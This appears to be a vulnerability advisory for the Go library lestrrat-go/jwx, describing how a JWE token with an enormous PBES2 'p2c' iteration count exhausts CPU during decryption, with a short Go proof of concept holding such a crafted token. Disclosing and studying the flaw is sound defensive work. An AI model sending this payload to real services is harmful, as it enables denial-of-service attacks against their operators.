summary: "lestrrat-go/jwx's malicious parameters in JWE can cause a DOS\n### Summary\ntoo high\
  \ p2c parameter in JWE's alg PBES2-* could lead to a DOS attack\n\n### Details\nThe JWE key\
  \ management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2\
  \ Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping\
  \ key. Its primary purpose is to intentionally slow down the key derivation function, making\
  \ password brute-force and dictionary attacks more resource- intensive.\nTherefore, if an\
  \ attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational\
  \ consumption, resulting in a DOS attack\n\n### PoC\n```go\npackage main\n\nimport (\n\t\"\
  fmt\"\n\t\"github.com/lestrrat-go/jwx/v2/jwa\"\n\t\"github.com/lestrrat-go/jwx/v2/jwe\"\n\t\
  \"github.com/lestrrat-go/jwx/v2/jwk\"\n)\n\nfunc main() {\n\ttoken := []byte(\"eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA\"\
  )\n\tkey, err := jwk.FromRaw([]byte(`abcdefg`))\n\tpayload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW,\
  \ key))\n\tif err == nil {\n\t\tfmt.Println(string(payload))\n\t}\n}\n\n```\n\n### Impact\n\
  It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount\
  \ of CPU resources."
